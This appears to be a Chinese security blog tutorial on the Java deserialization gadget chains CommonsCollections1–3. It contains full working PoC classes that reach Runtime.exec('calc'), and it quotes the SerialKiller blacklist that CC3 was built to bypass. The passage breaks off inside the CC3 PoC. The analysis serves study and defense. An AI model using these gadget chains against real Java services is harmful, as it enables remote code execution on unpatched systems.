<h3 id="CommonsCollections1（AnnotationInvocationHandler→LazyMap）"><a href="#CommonsCollections1（AnnotationInvocationHandler→LazyMap）" class="headerlink" title="CommonsCollections1（AnnotationInvocationHandler→LazyMap）"></a>CommonsCollections1（AnnotationInvocationHandler→LazyMap）</h3><p>前面提到过，<code>LazyMap</code> 修饰过的 <code>Map</code> 只要调用 <code>get</code> 方法就会触发 <code>transform</code> 方法。然而 <code>AnnotationInvocationHandler.readObject</code> 并没有调用 <code>get</code> 方法。</p>
<p>不过幸运的是 <code>AnnotationInvocationHandler</code> 实现了 <code>InvocationHandler</code> 接口，本身是一个动态代理接口对象，也就是说只要我们把一个 <code>Map</code> 用 <code>AnnotationInvocationHandler</code> 代理，那么代理后的 <code>Map</code> 的任何方法调用都会执行到 <code>AnnotationInvocationHandler</code> 的 <code>invoke</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure></div>
<p><code>AnnotationInvocationHandler</code> 的 <code>invoke</code> 方法特判几种方法后会调用 <code>memberValues</code> 的 <code>get</code> 方法，也就会触发 <code>LazyMap</code> 的 <code>transform</code> 方法调用。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> toStringImpl();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);  <span class="comment">// 调用 get 方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">        <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">        result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>完整 poc 如下，需要注意的是代理之后任何对 <code>proxyMap</code> 的操作都会触发 <code>transformer</code> 调用，因此需要最后设置恶意的 <code>Transformer</code>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line">        </span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">invoke:69, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">entrySet:-1, $Proxy1 (com.sun.proxy) 内层 AnnotationInvocationHandler 代理的 Map</span><br><span class="line">readObject:349, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">...</span><br><span class="line">main:42, CommonsCollections1 (com.example)</span><br></pre></td></tr></table></figure></div>
<h3 id="CommonsCollections2（PriorityQueue→TransformingComparator）"><a href="#CommonsCollections2（PriorityQueue→TransformingComparator）" class="headerlink" title="CommonsCollections2（PriorityQueue→TransformingComparator）"></a>CommonsCollections2（PriorityQueue→TransformingComparator）</h3><p>前面提到，<code>TransformingComparator</code> 在比较时会对比较的对象调用 <code>transform</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object obj1, Object obj2)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>而 Java 中内置的维护顺序的容器如 <code>PriorityQueue</code> 在反序列化时会对内部的元素进行排序，这个过程中在 <code>siftDownUsingComparator</code> 函数内涉及了元素大小的比较。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>因此我们只需要在创建 <code>PriorityQueue</code> 容器时指定比较对象为我们定义的 <code>TransformingComparator</code>，之后往 <code>PriorityQueue</code> 中随便放两个元素，那么在反序列化时就会调用 <code>comparator.compare</code> 方法触发 <code>transform</code> 方法调用。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,comparator);</span><br></pre></td></tr></table></figure></div>
<p>poc 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(queue);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>注意，类 <code>org.apache.commons.collections4.comparators.TransformingComparator</code>，在 commons-collections4.0 以前是版本中是没有实现 <code>Serializable</code> 接口的，无法在序列化中使用。</p>
<h3 id="CommonsCollections3（…→TrAXFilter→InstantiateTransformer）"><a href="#CommonsCollections3（…→TrAXFilter→InstantiateTransformer）" class="headerlink" title="CommonsCollections3（…→TrAXFilter→InstantiateTransformer）"></a>CommonsCollections3（…→TrAXFilter→InstantiateTransformer）</h3><p>2015 年初，@frohoff 和 @gebl 发布了 Talk《<a class="link"   href="https://frohoff.github.io/appseccali-marshalling-pickles/" >Marshalling Pickles: how deserializing objects will ruin your day <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>》，以及 Java 反序列化利用工具 ysoserial，随后引爆了安全界。开发者们⾃然会去找寻一种安全的过滤方法，于是类似 <a class="link"   href="https://github.com/ikkisoft/SerialKiller" >SerialKiller <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 这样的工具随之诞生。</p>
<p>SerialKiller 是一个 Java 反序列化过滤器，可以通过黑名单与白名单的方式来限制反序列化时允许通过的类。在其发布的第一个版本代码中，我们可以看到其给出了最初的<a class="link"   href="https://github.com/ikkisoft/SerialKiller/blob/998c0abc5b/config/serialkiller.conf" >黑名单 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- serialkiller.conf --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">refresh</span>&gt;</span>6000<span class="tag">&lt;/<span class="name">refresh</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">blacklist</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- ysoserial&#x27;s CommonsCollections1 payload  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.apache\.commons\.collections\.functors\.InvokerTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">	<span class="comment">&lt;!-- ysoserial&#x27;s CommonsCollections2 payload  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.apache\.commons\.collections4\.functors\.InvokerTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- ysoserial&#x27;s Groovy payload  --&gt;</span>	</span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.codehaus\.groovy\.runtime\.ConvertedClosure$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.codehaus\.groovy\.runtime\.MethodClosure$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">	<span class="comment">&lt;!-- ysoserial&#x27;s Spring1 payload  --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.springframework\.beans\.factory\.ObjectFactory$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">    <span class="tag">&lt;/<span class="name">blacklist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">whitelist</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>.*<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">whitelist</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这个黑名单中 <code>InvokerTransformer</code> 赫然在列，也就切断了 <code>CommonsCollections1</code> 的利⽤链。有攻就有防，ysoserial 随后增加了不少新的 Gadgets，其中就包括 CommonsCollections3。</p>
<p>CommonsCollections3 的目的很明显，就是为了绕过一些规则对 <code>InvokerTransformer</code> 的限制。CommonsCollections3 并没有使用到 <code>InvokerTransformer</code> 来调用任意方法，而是用到了另一个类，<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>。</p>
<p>这个类的构造方法中调用了 <code>(TransformerImpl) templates.newTransformer()</code> ，免去了我们使用 <code>InvokerTransformer</code> 手工调用 <code>newTransformer()</code> 方法这一步：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer(); <span class="comment">// &lt;---</span></span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>我们可以构造如下 <code>ChainedTransformer</code>：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>poc 如下，这个是基于 CC1 的 <code>LazyMap</code> 链，其实这里可以自由组合其他的链，只要能调用到 <code>transform</code> 方法即可。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span 